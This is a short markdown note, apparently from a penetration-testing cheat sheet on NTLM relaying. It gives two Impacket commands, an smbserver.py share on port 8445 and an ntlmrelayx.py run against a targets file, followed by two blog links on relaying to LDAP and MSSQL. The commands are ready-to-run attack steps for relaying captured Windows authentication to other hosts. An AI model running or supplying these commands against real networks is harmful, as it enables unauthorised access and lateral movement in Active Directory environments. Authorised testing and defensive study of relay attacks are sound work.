# 02 - NTLM Relaying

```
$ smbserver.py -smb2support -port 8445 share $(pwd)

$ ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --no-wcf-server --no-raw-server
```

---
## References

- [Praetorian: How to Exploit Active Directory ACL Attack Paths Through LDAP Relaying Attacks](https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/)

- [Compass Security: Relaying NTLM to MSSQL](https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/)